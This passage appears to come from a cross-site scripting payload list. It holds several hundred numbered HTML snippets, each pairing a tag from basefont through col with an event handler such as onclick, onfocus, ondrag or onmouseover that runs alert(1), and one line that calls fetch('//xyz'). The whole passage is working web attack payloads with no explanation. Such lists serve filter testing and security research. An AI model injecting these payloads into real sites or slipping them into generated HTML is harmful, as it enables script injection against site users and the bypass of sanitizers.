 516 | <basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>
 517 | <basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>
 518 | <basefont id=x tabindex=1 onfocus=alert(1)></basefont>
 519 | <basefont id=x tabindex=1 onfocusin=alert(1)></basefont>
 520 | <basefont onbeforecopy="alert(1)" contenteditable>test</basefont>
 521 | <basefont onbeforecut="alert(1)" contenteditable>test</basefont>
 522 | <basefont onbeforepaste="alert(1)" contenteditable>test</basefont>
 523 | <basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>
 524 | <basefont onclick="alert(1)">test</basefont>
 525 | <basefont oncontextmenu="alert(1)">test</basefont>
 526 | <basefont oncopy="alert(1)" contenteditable>test</basefont>
 527 | <basefont oncut="alert(1)" contenteditable>test</basefont>
 528 | <basefont ondblclick="alert(1)">test</basefont>
 529 | <basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>
 530 | <basefont onkeydown="alert(1)" contenteditable>test</basefont>
 531 | <basefont onkeypress="alert(1)" contenteditable>test</basefont>
 532 | <basefont onkeyup="alert(1)" contenteditable>test</basefont>
 533 | <basefont onmousedown="alert(1)">test</basefont>
 534 | <basefont onmouseenter="alert(1)">test</basefont>
 535 | <basefont onmouseleave="alert(1)">test</basefont>
 536 | <basefont onmousemove="alert(1)">test</basefont>
 537 | <basefont onmouseout="alert(1)">test</basefont>
 538 | <basefont onmouseover="alert(1)">test</basefont>
 539 | <basefont onmouseup="alert(1)">test</basefont>
 540 | <basefont onpaste="alert(1)" contenteditable>test</basefont>
 541 | <bdi draggable="true" ondrag="alert(1)">test</bdi>
 542 | <bdi draggable="true" ondragend="alert(1)">test</bdi>
 543 | <bdi draggable="true" ondragenter="alert(1)">test</bdi>
 544 | <bdi draggable="true" ondragleave="alert(1)">test</bdi>
 545 | <bdi draggable="true" ondragstart="alert(1)">test</bdi>
 546 | <bdi id=x tabindex=1 onactivate=alert(1)></bdi>
 547 | <bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>
 548 | <bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>
 549 | <bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>
 550 | <bdi id=x tabindex=1 onfocus=alert(1)></bdi>
 551 | <bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
 552 | <bdi onbeforecopy="alert(1)" contenteditable>test</bdi>
 553 | <bdi onbeforecut="alert(1)" contenteditable>test</bdi>
 554 | <bdi onbeforepaste="alert(1)" contenteditable>test</bdi>
 555 | <bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>
 556 | <bdi onclick="alert(1)">test</bdi>
 557 | <bdi oncontextmenu="alert(1)">test</bdi>
 558 | <bdi oncopy="alert(1)" contenteditable>test</bdi>
 559 | <bdi oncut="alert(1)" contenteditable>test</bdi>
 560 | <bdi ondblclick="alert(1)">test</bdi>
 561 | <bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>
 562 | <bdi onkeydown="alert(1)" contenteditable>test</bdi>
 563 | <bdi onkeypress="alert(1)" contenteditable>test</bdi>
 564 | <bdi onkeyup="alert(1)" contenteditable>test</bdi>
 565 | <bdi onmousedown="alert(1)">test</bdi>
 566 | <bdi onmouseenter="alert(1)">test</bdi>
 567 | <bdi onmouseleave="alert(1)">test</bdi>
 568 | <bdi onmousemove="alert(1)">test</bdi>
 569 | <bdi onmouseout="alert(1)">test</bdi>
 570 | <bdi onmouseover="alert(1)">test</bdi>
 571 | <bdi onmouseup="alert(1)">test</bdi>
 572 | <bdi onpaste="alert(1)" contenteditable>test</bdi>
 573 | <bdo draggable="true" ondrag="alert(1)">test</bdo>
 574 | <bdo draggable="true" ondragend="alert(1)">test</bdo>
 575 | <bdo draggable="true" ondragenter="alert(1)">test</bdo>
 576 | <bdo draggable="true" ondragleave="alert(1)">test</bdo>
 577 | <bdo draggable="true" ondragstart="alert(1)">test</bdo>
 578 | <bdo id=x tabindex=1 onactivate=alert(1)></bdo>
 579 | <bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>
 580 | <bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>
 581 | <bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>
 582 | <bdo id=x tabindex=1 onfocus=alert(1)></bdo>
 583 | <bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
 584 | <bdo onbeforecopy="alert(1)" contenteditable>test</bdo>
 585 | <bdo onbeforecut="alert(1)" contenteditable>test</bdo>
 586 | <bdo onbeforepaste="alert(1)" contenteditable>test</bdo>
 587 | <bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>
 588 | <bdo onclick="alert(1)">test</bdo>
 589 | <bdo oncontextmenu="alert(1)">test</bdo>
 590 | <bdo oncopy="alert(1)" contenteditable>test</bdo>
 591 | <bdo oncut="alert(1)" contenteditable>test</bdo>
 592 | <bdo ondblclick="alert(1)">test</bdo>
 593 | <bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>
 594 | <bdo onkeydown="alert(1)" contenteditable>test</bdo>
 595 | <bdo onkeypress="alert(1)" contenteditable>test</bdo>
 596 | <bdo onkeyup="alert(1)" contenteditable>test</bdo>
 597 | <bdo onmousedown="alert(1)">test</bdo>
 598 | <bdo onmouseenter="alert(1)">test</bdo>
 599 | <bdo onmouseleave="alert(1)">test</bdo>
 600 | <bdo onmousemove="alert(1)">test</bdo>
 601 | <bdo onmouseout="alert(1)">test</bdo>
 602 | <bdo onmouseover="alert(1)">test</bdo>
 603 | <bdo onmouseup="alert(1)">test</bdo>
 604 | <bdo onpaste="alert(1)" contenteditable>test</bdo>
 605 | <bgsound draggable="true" ondrag="alert(1)">test</bgsound>
 606 | <bgsound draggable="true" ondragend="alert(1)">test</bgsound>
 607 | <bgsound draggable="true" ondragenter="alert(1)">test</bgsound>
 608 | <bgsound draggable="true" ondragleave="alert(1)">test</bgsound>
 609 | <bgsound draggable="true" ondragstart="alert(1)">test</bgsound>
 610 | <bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>
 611 | <bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>
 612 | <bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>
 613 | <bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>
 614 | <bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>
 615 | <bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>
 616 | <bgsound onbeforecopy="alert(1)" contenteditable>test</bgsound>
 617 | <bgsound onbeforecut="alert(1)" contenteditable>test</bgsound>
 618 | <bgsound onbeforepaste="alert(1)" contenteditable>test</bgsound>
 619 | <bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>
 620 | <bgsound onclick="alert(1)">test</bgsound>
 621 | <bgsound oncontextmenu="alert(1)">test</bgsound>
 622 | <bgsound oncopy="alert(1)" contenteditable>test</bgsound>
 623 | <bgsound oncut="alert(1)" contenteditable>test</bgsound>
 624 | <bgsound ondblclick="alert(1)">test</bgsound>
 625 | <bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>
 626 | <bgsound onkeydown="alert(1)" contenteditable>test</bgsound>
 627 | <bgsound onkeypress="alert(1)" contenteditable>test</bgsound>
 628 | <bgsound onkeyup="alert(1)" contenteditable>test</bgsound>
 629 | <bgsound onmousedown="alert(1)">test</bgsound>
 630 | <bgsound onmouseenter="alert(1)">test</bgsound>
 631 | <bgsound onmouseleave="alert(1)">test</bgsound>
 632 | <bgsound onmousemove="alert(1)">test</bgsound>
 633 | <bgsound onmouseout="alert(1)">test</bgsound>
 634 | <bgsound onmouseover="alert(1)">test</bgsound>
 635 | <bgsound onmouseup="alert(1)">test</bgsound>
 636 | <bgsound onpaste="alert(1)" contenteditable>test</bgsound>
 637 | <big draggable="true" ondrag="alert(1)">test</big>
 638 | <big draggable="true" ondragend="alert(1)">test</big>
 639 | <big draggable="true" ondragenter="alert(1)">test</big>
 640 | <big draggable="true" ondragleave="alert(1)">test</big>
 641 | <big draggable="true" ondragstart="alert(1)">test</big>
 642 | <big id=x tabindex=1 onactivate=alert(1)></big>
 643 | <big id=x tabindex=1 onbeforeactivate=alert(1)></big>
 644 | <big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>
 645 | <big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>
 646 | <big id=x tabindex=1 onfocus=alert(1)></big>
 647 | <big id=x tabindex=1 onfocusin=alert(1)></big>
 648 | <big onbeforecopy="alert(1)" contenteditable>test</big>
 649 | <big onbeforecut="alert(1)" contenteditable>test</big>
 650 | <big onbeforepaste="alert(1)" contenteditable>test</big>
 651 | <big onblur=alert(1) tabindex=1 id=x></big><input autofocus>
 652 | <big onclick="alert(1)">test</big>
 653 | <big oncontextmenu="alert(1)">test</big>
 654 | <big oncopy="alert(1)" contenteditable>test</big>
 655 | <big oncut="alert(1)" contenteditable>test</big>
 656 | <big ondblclick="alert(1)">test</big>
 657 | <big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>
 658 | <big onkeydown="alert(1)" contenteditable>test</big>
 659 | <big onkeypress="alert(1)" contenteditable>test</big>
 660 | <big onkeyup="alert(1)" contenteditable>test</big>
 661 | <big onmousedown="alert(1)">test</big>
 662 | <big onmouseenter="alert(1)">test</big>
 663 | <big onmouseleave="alert(1)">test</big>
 664 | <big onmousemove="alert(1)">test</big>
 665 | <big onmouseout="alert(1)">test</big>
 666 | <big onmouseover="alert(1)">test</big>
 667 | <big onmouseup="alert(1)">test</big>
 668 | <big onpaste="alert(1)" contenteditable>test</big>
 669 | <blink draggable="true" ondrag="alert(1)">test</blink>
 670 | <blink draggable="true" ondragend="alert(1)">test</blink>
 671 | <blink draggable="true" ondragenter="alert(1)">test</blink>
 672 | <blink draggable="true" ondragleave="alert(1)">test</blink>
 673 | <blink draggable="true" ondragstart="alert(1)">test</blink>
 674 | <blink id=x tabindex=1 onactivate=alert(1)></blink>
 675 | <blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>
 676 | <blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>
 677 | <blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>
 678 | <blink id=x tabindex=1 onfocus=alert(1)></blink>
 679 | <blink id=x tabindex=1 onfocusin=alert(1)></blink>
 680 | <blink onbeforecopy="alert(1)" contenteditable>test</blink>
 681 | <blink onbeforecut="alert(1)" contenteditable>test</blink>
 682 | <blink onbeforepaste="alert(1)" contenteditable>test</blink>
 683 | <blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>
 684 | <blink onclick="alert(1)">test</blink>
 685 | <blink oncontextmenu="alert(1)">test</blink>
 686 | <blink oncopy="alert(1)" contenteditable>test</blink>
 687 | <blink oncut="alert(1)" contenteditable>test</blink>
 688 | <blink ondblclick="alert(1)">test</blink>
 689 | <blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>
 690 | <blink onkeydown="alert(1)" contenteditable>test</blink>
 691 | <blink onkeypress="alert(1)" contenteditable>test</blink>
 692 | <blink onkeyup="alert(1)" contenteditable>test</blink>
 693 | <blink onmousedown="alert(1)">test</blink>
 694 | <blink onmouseenter="alert(1)">test</blink>
 695 | <blink onmouseleave="alert(1)">test</blink>
 696 | <blink onmousemove="alert(1)">test</blink>
 697 | <blink onmouseout="alert(1)">test</blink>
 698 | <blink onmouseover="alert(1)">test</blink>
 699 | <blink onmouseup="alert(1)">test</blink>
 700 | <blink onpaste="alert(1)" contenteditable>test</blink>
 701 | <blockquote draggable="true" ondrag="alert(1)">test</blockquote>
 702 | <blockquote draggable="true" ondragend="alert(1)">test</blockquote>
 703 | <blockquote draggable="true" ondragenter="alert(1)">test</blockquote>
 704 | <blockquote draggable="true" ondragleave="alert(1)">test</blockquote>
 705 | <blockquote draggable="true" ondragstart="alert(1)">test</blockquote>
 706 | <blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>
 707 | <blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>
 708 | <blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>
 709 | <blockquote id=x tabindex=1 ondeactivate=alert(1)></blockquote><input id=y autofocus>
 710 | <blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>
 711 | <blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>
 712 | <blockquote onbeforecopy="alert(1)" contenteditable>test</blockquote>
 713 | <blockquote onbeforecut="alert(1)" contenteditable>test</blockquote>
 714 | <blockquote onbeforepaste="alert(1)" contenteditable>test</blockquote>
 715 | <blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>
 716 | <blockquote onclick="alert(1)">test</blockquote>
 717 | <blockquote oncontextmenu="alert(1)">test</blockquote>
 718 | <blockquote oncopy="alert(1)" contenteditable>test</blockquote>
 719 | <blockquote oncut="alert(1)" contenteditable>test</blockquote>
 720 | <blockquote ondblclick="alert(1)">test</blockquote>
 721 | <blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>
 722 | <blockquote onkeydown="alert(1)" contenteditable>test</blockquote>
 723 | <blockquote onkeypress="alert(1)" contenteditable>test</blockquote>
 724 | <blockquote onkeyup="alert(1)" contenteditable>test</blockquote>
 725 | <blockquote onmousedown="alert(1)">test</blockquote>
 726 | <blockquote onmouseenter="alert(1)">test</blockquote>
 727 | <blockquote onmouseleave="alert(1)">test</blockquote>
 728 | <blockquote onmousemove="alert(1)">test</blockquote>
 729 | <blockquote onmouseout="alert(1)">test</blockquote>
 730 | <blockquote onmouseover="alert(1)">test</blockquote>
 731 | <blockquote onmouseup="alert(1)">test</blockquote>
 732 | <blockquote onpaste="alert(1)" contenteditable>test</blockquote>
 733 | <body draggable="true" ondrag="alert(1)">test</body>
 734 | <body draggable="true" ondragend="alert(1)">test</body>
 735 | <body draggable="true" ondragenter="alert(1)">test</body>
 736 | <body draggable="true" ondragleave="alert(1)">test</body>
 737 | <body draggable="true" ondragstart="alert(1)">test</body>
 738 | <body id=x tabindex=1 onactivate=alert(1)></body>
 739 | <body id=x tabindex=1 onbeforeactivate=alert(1)></body>
 740 | <body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>
 741 | <body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>
 742 | <body id=x tabindex=1 onfocus=alert(1)></body>
 743 | <body id=x tabindex=1 onfocusin=alert(1)></body>
 744 | <body onafterprint=alert(1)>
 745 | <body onbeforecopy="alert(1)" contenteditable>test</body>
 746 | <body onbeforecut="alert(1)" contenteditable>test</body>
 747 | <body onbeforepaste="alert(1)" contenteditable>test</body>
 748 | <body onbeforeprint=alert(1)>
 749 | <body onbeforeunload="location='javascript:alert(1)'">
 750 | <body onblur=alert(1) id=x><iframe id=x>
 751 | <body onclick="alert(1)">test</body>
 752 | <body oncontextmenu="alert(1)">test</body>
 753 | <body oncopy="alert(1)" contenteditable>test</body>
 754 | <body oncut="alert(1)" contenteditable>test</body>
 755 | <body ondblclick="alert(1)">test</body>
 756 | <body onerror=alert(1) onload=/>
 757 | <body onfocusout=alert(1) id=x><iframe id=x>
 758 | <body onhashchange="alert(1)">
 759 | <body onkeydown="alert(1)" contenteditable>test</body>
 760 | <body onkeypress="alert(1)" contenteditable>test</body>
 761 | <body onkeyup="alert(1)" contenteditable>test</body>
 762 | <body onload=alert(1)>
 763 | <body onmessage=alert(1)>
 764 | <body onmousedown="alert(1)">test</body>
 765 | <body onmouseenter="alert(1)">test</body>
 766 | <body onmouseleave="alert(1)">test</body>
 767 | <body onmousemove="alert(1)">test</body>
 768 | <body onmouseout="alert(1)">test</body>
 769 | <body onmouseover="alert(1)">test</body>
 770 | <body onmouseup="alert(1)">test</body>
 771 | <body onpageshow=alert(1)>
 772 | <body onpaste="alert(1)" contenteditable>test</body>
 773 | <body onpopstate=alert(1)>
 774 | <body onresize="alert(1)">
 775 | <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
 776 | <body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
 777 | <body onwheel=alert(1)>
 778 | <br draggable="true" ondrag="alert(1)">test</br>
 779 | <br draggable="true" ondragend="alert(1)">test</br>
 780 | <br draggable="true" ondragenter="alert(1)">test</br>
 781 | <br draggable="true" ondragleave="alert(1)">test</br>
 782 | <br draggable="true" ondragstart="alert(1)">test</br>
 783 | <br id=x tabindex=1 onactivate=alert(1)></br>
 784 | <br id=x tabindex=1 onbeforeactivate=alert(1)></br>
 785 | <br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>
 786 | <br id=x tabindex=1 ondeactivate=alert(1)></br><input id=y autofocus>
 787 | <br id=x tabindex=1 onfocus=alert(1)></br>
 788 | <br id=x tabindex=1 onfocusin=alert(1)></br>
 789 | <br onbeforecopy="alert(1)" contenteditable>test</br>
 790 | <br onbeforecut="alert(1)" contenteditable>test</br>
 791 | <br onbeforepaste="alert(1)" contenteditable>test</br>
 792 | <br onblur=alert(1) tabindex=1 id=x></br><input autofocus>
 793 | <br onclick="alert(1)">test</br>
 794 | <br oncontextmenu="alert(1)">test</br>
 795 | <br oncopy="alert(1)" contenteditable>test</br>
 796 | <br oncut="alert(1)" contenteditable>test</br>
 797 | <br ondblclick="alert(1)">test</br>
 798 | <br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>
 799 | <br onkeydown="alert(1)" contenteditable>test</br>
 800 | <br onkeypress="alert(1)" contenteditable>test</br>
 801 | <br onkeyup="alert(1)" contenteditable>test</br>
 802 | <br onmousedown="alert(1)">test</br>
 803 | <br onmouseenter="alert(1)">test</br>
 804 | <br onmouseleave="alert(1)">test</br>
 805 | <br onmousemove="alert(1)">test</br>
 806 | <br onmouseout="alert(1)">test</br>
 807 | <br onmouseover="alert(1)">test</br>
 808 | <br onmouseup="alert(1)">test</br>
 809 | <br onpaste="alert(1)" contenteditable>test</br>
 810 | <button autofocus onfocus=alert(1)>test</button>
 811 | <button autofocus onfocusin=alert(1)>test</button>
 812 | <button draggable="true" ondrag="alert(1)">test</button>
 813 | <button draggable="true" ondragend="alert(1)">test</button>
 814 | <button draggable="true" ondragenter="alert(1)">test</button>
 815 | <button draggable="true" ondragleave="alert(1)">test</button>
 816 | <button draggable="true" ondragstart="alert(1)">test</button>
 817 | <button id=x tabindex=1 onactivate=alert(1)></button>
 818 | <button id=x tabindex=1 onbeforeactivate=alert(1)></button>
 819 | <button id=x tabindex=1 onbeforedeactivate=alert(1)></button><input autofocus>
 820 | <button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>
 821 | <button onbeforecopy="alert(1)" contenteditable>test</button>
 822 | <button onbeforecut="alert(1)" contenteditable>test</button>
 823 | <button onbeforepaste="alert(1)" contenteditable>test</button>
 824 | <button onblur=alert(1) id=x></button><input autofocus>
 825 | <button onclick="alert(1)">test</button>
 826 | <button oncontextmenu="alert(1)">test</button>
 827 | <button oncopy="alert(1)" contenteditable>test</button>
 828 | <button oncut="alert(1)" contenteditable>test</button>
 829 | <button ondblclick="alert(1)">test</button>
 830 | <button onfocusout=alert(1) id=x></button><input autofocus>
 831 | <button onkeydown="alert(1)" contenteditable>test</button>
 832 | <button onkeypress="alert(1)" contenteditable>test</button>
 833 | <button onkeyup="alert(1)" contenteditable>test</button>
 834 | <button onmousedown="alert(1)">test</button>
 835 | <button onmouseenter="alert(1)">test</button>
 836 | <button onmouseleave="alert(1)">test</button>
 837 | <button onmousemove="alert(1)">test</button>
 838 | <button onmouseout="alert(1)">test</button>
 839 | <button onmouseover="alert(1)">test</button>
 840 | <button onmouseup="alert(1)">test</button>
 841 | <button onpaste="alert(1)" contenteditable>test</button>
 842 | <canvas draggable="true" ondrag="alert(1)">test</canvas>
 843 | <canvas draggable="true" ondragend="alert(1)">test</canvas>
 844 | <canvas draggable="true" ondragenter="alert(1)">test</canvas>
 845 | <canvas draggable="true" ondragleave="alert(1)">test</canvas>
 846 | <canvas draggable="true" ondragstart="alert(1)">test</canvas>
 847 | <canvas id=x tabindex=1 onactivate=alert(1)></canvas>
 848 | <canvas id=x tabindex=1 onbeforeactivate=alert(1)></canvas>
 849 | <canvas id=x tabindex=1 onbeforedeactivate=alert(1)></canvas><input autofocus>
 850 | <canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>
 851 | <canvas id=x tabindex=1 onfocus=alert(1)></canvas>
 852 | <canvas id=x tabindex=1 onfocusin=alert(1)></canvas>
 853 | <canvas onbeforecopy="alert(1)" contenteditable>test</canvas>
 854 | <canvas onbeforecut="alert(1)" contenteditable>test</canvas>
 855 | <canvas onbeforepaste="alert(1)" contenteditable>test</canvas>
 856 | <canvas onblur=alert(1) tabindex=1 id=x></canvas><input autofocus>
 857 | <canvas onclick="alert(1)">test</canvas>
 858 | <canvas oncontextmenu="alert(1)">test</canvas>
 859 | <canvas oncopy="alert(1)" contenteditable>test</canvas>
 860 | <canvas oncut="alert(1)" contenteditable>test</canvas>
 861 | <canvas ondblclick="alert(1)">test</canvas>
 862 | <canvas onfocusout=alert(1) tabindex=1 id=x></canvas><input autofocus>
 863 | <canvas onkeydown="alert(1)" contenteditable>test</canvas>
 864 | <canvas onkeypress="alert(1)" contenteditable>test</canvas>
 865 | <canvas onkeyup="alert(1)" contenteditable>test</canvas>
 866 | <canvas onmousedown="alert(1)">test</canvas>
 867 | <canvas onmouseenter="alert(1)">test</canvas>
 868 | <canvas onmouseleave="alert(1)">test</canvas>
 869 | <canvas onmousemove="alert(1)">test</canvas>
 870 | <canvas onmouseout="alert(1)">test</canvas>
 871 | <canvas onmouseover="alert(1)">test</canvas>
 872 | <canvas onmouseup="alert(1)">test</canvas>
 873 | <canvas onpaste="alert(1)" contenteditable>test</canvas>
 874 | <caption draggable="true" ondrag="alert(1)">test</caption>
 875 | <caption draggable="true" ondragend="alert(1)">test</caption>
 876 | <caption draggable="true" ondragenter="alert(1)">test</caption>
 877 | <caption draggable="true" ondragleave="alert(1)">test</caption>
 878 | <caption draggable="true" ondragstart="alert(1)">test</caption>
 879 | <caption id=x tabindex=1 onactivate=alert(1)></caption>
 880 | <caption id=x tabindex=1 onbeforeactivate=alert(1)></caption>
 881 | <caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>
 882 | <caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>
 883 | <caption id=x tabindex=1 onfocus=alert(1)></caption>
 884 | <caption id=x tabindex=1 onfocusin=alert(1)></caption>
 885 | <caption onbeforecopy="alert(1)" contenteditable>test</caption>
 886 | <caption onbeforecut="alert(1)" contenteditable>test</caption>
 887 | <caption onbeforepaste="alert(1)" contenteditable>test</caption>
 888 | <caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>
 889 | <caption onclick="alert(1)">test</caption>
 890 | <caption oncontextmenu="alert(1)">test</caption>
 891 | <caption oncopy="alert(1)" contenteditable>test</caption>
 892 | <caption oncut="alert(1)" contenteditable>test</caption>
 893 | <caption ondblclick="alert(1)">test</caption>
 894 | <caption onfocusout=alert(1) tabindex=1 id=x></caption><input autofocus>
 895 | <caption onkeydown="alert(1)" contenteditable>test</caption>
 896 | <caption onkeypress="alert(1)" contenteditable>test</caption>
 897 | <caption onkeyup="alert(1)" contenteditable>test</caption>
 898 | <caption onmousedown="alert(1)">test</caption>
 899 | <caption onmouseenter="alert(1)">test</caption>
 900 | <caption onmouseleave="alert(1)">test</caption>
 901 | <caption onmousemove="alert(1)">test</caption>
 902 | <caption onmouseout="alert(1)">test</caption>
 903 | <caption onmouseover="alert(1)">test</caption>
 904 | <caption onmouseup="alert(1)">test</caption>
 905 | <caption onpaste="alert(1)" contenteditable>test</caption>
 906 | <center draggable="true" ondrag="alert(1)">test</center>
 907 | <center draggable="true" ondragend="alert(1)">test</center>
 908 | <center draggable="true" ondragenter="alert(1)">test</center>
 909 | <center draggable="true" ondragleave="alert(1)">test</center>
 910 | <center draggable="true" ondragstart="alert(1)">test</center>
 911 | <center id=x tabindex=1 onactivate=alert(1)></center>
 912 | <center id=x tabindex=1 onbeforeactivate=alert(1)></center>
 913 | <center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>
 914 | <center id=x tabindex=1 ondeactivate=alert(1)></center><input id=y autofocus>
 915 | <center id=x tabindex=1 onfocus=alert(1)></center>
 916 | <center id=x tabindex=1 onfocusin=alert(1)></center>
 917 | <center onbeforecopy="alert(1)" contenteditable>test</center>
 918 | <center onbeforecut="alert(1)" contenteditable>test</center>
 919 | <center onbeforepaste="alert(1)" contenteditable>test</center>
 920 | <center onblur=alert(1) tabindex=1 id=x></center><input autofocus>
 921 | <center onclick="alert(1)">test</center>
 922 | <center oncontextmenu="alert(1)">test</center>
 923 | <center oncopy="alert(1)" contenteditable>test</center>
 924 | <center oncut="alert(1)" contenteditable>test</center>
 925 | <center ondblclick="alert(1)">test</center>
 926 | <center onfocusout=alert(1) tabindex=1 id=x></center><input autofocus>
 927 | <center onkeydown="alert(1)" contenteditable>test</center>
 928 | <center onkeypress="alert(1)" contenteditable>test</center>
 929 | <center onkeyup="alert(1)" contenteditable>test</center>
 930 | <center onmousedown="alert(1)">test</center>
 931 | <center onmouseenter="alert(1)">test</center>
 932 | <center onmouseleave="alert(1)">test</center>
 933 | <center onmousemove="alert(1)">test</center>
 934 | <center onmouseout="alert(1)">test</center>
 935 | <center onmouseover="alert(1)">test</center>
 936 | <center onmouseup="alert(1)">test</center>
 937 | <center onpaste="alert(1)" contenteditable>test</center>
 938 | <cite draggable="true" ondrag="alert(1)">test</cite>
 939 | <cite draggable="true" ondragend="alert(1)">test</cite>
 940 | <cite draggable="true" ondragenter="alert(1)">test</cite>
 941 | <cite draggable="true" ondragleave="alert(1)">test</cite>
 942 | <cite draggable="true" ondragstart="alert(1)">test</cite>
 943 | <cite id=x tabindex=1 onactivate=alert(1)></cite>
 944 | <cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>
 945 | <cite id=x tabindex=1 onbeforedeactivate=alert(1)></cite><input autofocus>
 946 | <cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>
 947 | <cite id=x tabindex=1 onfocus=alert(1)></cite>
 948 | <cite id=x tabindex=1 onfocusin=alert(1)></cite>
 949 | <cite onbeforecopy="alert(1)" contenteditable>test</cite>
 950 | <cite onbeforecut="alert(1)" contenteditable>test</cite>
 951 | <cite onbeforepaste="alert(1)" contenteditable>test</cite>
 952 | <cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>
 953 | <cite onclick="alert(1)">test</cite>
 954 | <cite oncontextmenu="alert(1)">test</cite>
 955 | <cite oncopy="alert(1)" contenteditable>test</cite>
 956 | <cite oncut="alert(1)" contenteditable>test</cite>
 957 | <cite ondblclick="alert(1)">test</cite>
 958 | <cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>
 959 | <cite onkeydown="alert(1)" contenteditable>test</cite>
 960 | <cite onkeypress="alert(1)" contenteditable>test</cite>
 961 | <cite onkeyup="alert(1)" contenteditable>test</cite>
 962 | <cite onmousedown="alert(1)">test</cite>
 963 | <cite onmouseenter="alert(1)">test</cite>
 964 | <cite onmouseleave="alert(1)">test</cite>
 965 | <cite onmousemove="alert(1)">test</cite>
 966 | <cite onmouseout="alert(1)">test</cite>
 967 | <cite onmouseover="alert(1)">test</cite>
 968 | <cite onmouseup="alert(1)">test</cite>
 969 | <cite onpaste="alert(1)" contenteditable>test</cite>
 970 | <code draggable="true" ondrag="alert(1)">test</code>
 971 | <code draggable="true" ondragend="alert(1)">test</code>
 972 | <code draggable="true" ondragenter="alert(1)">test</code>
 973 | <code draggable="true" ondragleave="alert(1)">test</code>
 974 | <code draggable="true" ondragstart="alert(1)">test</code>
 975 | <code id=x tabindex=1 onactivate=alert(1)></code>
 976 | <code id=x tabindex=1 onbeforeactivate=alert(1)></code>
 977 | <code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>
 978 | <code id=x tabindex=1 ondeactivate=alert(1)></code><input id=y autofocus>
 979 | <code id=x tabindex=1 onfocus=alert(1)></code>
 980 | <code id=x tabindex=1 onfocusin=alert(1)></code>
 981 | <code onbeforecopy="alert(1)" contenteditable>test</code>
 982 | <code onbeforecut="alert(1)" contenteditable>test</code>
 983 | <code onbeforepaste="alert(1)" contenteditable>test</code>
 984 | <code onblur=alert(1) tabindex=1 id=x></code><input autofocus>
 985 | <code onclick="alert(1)">test</code>
 986 | <code oncontextmenu="alert(1)">test</code>
 987 | <code oncopy="alert(1)" contenteditable>test</code>
 988 | <code oncut="alert(1)" contenteditable>test</code>
 989 | <code ondblclick="alert(1)">test</code>
 990 | <code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>
 991 | <code onkeydown="alert(1)" contenteditable>test</code>
 992 | <code onkeypress="alert(1)" contenteditable>test</code>
 993 | <code onkeyup="alert(1)" contenteditable>test</code>
 994 | <code onmousedown="alert(1)">test</code>
 995 | <code onmouseenter="alert(1)">test</code>
 996 | <code onmouseleave="alert(1)">test</code>
 997 | <code onmousemove="alert(1)">test</code>
 998 | <code onmouseout="alert(1)">test</code>
 999 | <code onmouseover="alert(1)">test</code>
1000 | <code onmouseup="alert(1)">test</code>
1001 | <code onpaste="alert(1)" contenteditable>test</code>
1002 | <col draggable="true" ondrag="alert(1)">test</col>
1003 | <col draggable="true" ondragend="alert(1)">test</col>
1004 | <col draggable="true" ondragenter="alert(1)">test</col>
1005 | <col draggable="true" ondragleave="alert(1)">test</col>
1006 | <col draggable="true" ondragstart="alert(1)">test</col>
